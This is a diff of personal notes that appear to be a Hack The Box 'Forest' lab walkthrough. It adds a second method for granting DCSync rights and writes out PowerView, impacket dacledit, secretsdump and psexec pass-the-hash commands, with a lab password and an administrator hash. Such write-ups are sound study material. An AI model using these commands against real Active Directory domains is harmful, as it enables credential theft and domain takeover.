@@ -132,7 +132,7 @@ Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
 >[!example]- Result
 >![[Pasted image 20250313111316.png]]
 
-
+## Method 1: Using Add-DomainObjectAcl
 - Now we can do the next step "WriteDacl", keep in mind that the current session has the old permission (not the new permission with `EXCHANGE WINDOWS PERMISSIONS`), so we need to create a new credentials(PScredentials), `TargetIdentity` can be `DC=htb,DC=local` or `htb.local\Domain Admins`, "Referring Objects"[^2]
 ```powershell
 $SecPassword2 = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
@@ -144,7 +144,15 @@ Add-DomainObjectAcl -Credential $Cred2 -TargetIdentity 'DC=htb,DC=local' -Princi
 >. .\PowerView.ps1; $Cred=New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',(ConvertTo-SecureString 's3rvice' -AsPlainText -Force)); Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -Credential $Cred;  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
 >```
 
-- now we can use [[impacket-secretsdump]] to dump hashes and [[psexec.py]] to get access
+## Method 2: Using Impacket-dacledit
+- Once we are part of the group 'EXCHANGE WINDOWS PERMISSIONS' we can use [[impacket-dacledit]] in order to edit ACL of the DC, and give us access
+```bash
+python3 /home/jr117/.local/pipx/venvs/impacket/bin/dacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
+```
+>[!example]- Result
+>![[Pasted image 20250313131725.png]]
+
+- Now we can use [[impacket-secretsdump]] to dump hashes and [[psexec.py]] to get access
 ```bash
 psexec.py FOREST.htb.local/administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'
 secretsdump.py svc-alfresco:s3rvice@10.10.10.161
@@ -153,8 +161,9 @@ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 >![[Pasted image 20250313121110.png]]
 >![[Pasted image 20250313121045.png]]
 
+
 # Note
-- You have to do this process as fast as u can because there are a task that clean up all permision since 60s
+- You have to do this process as fast as u can because there are a task that clean up all permission since 60s
 ```bash
 schtasks /query /fo table
 schtasks /query /tn restore /v /fo list
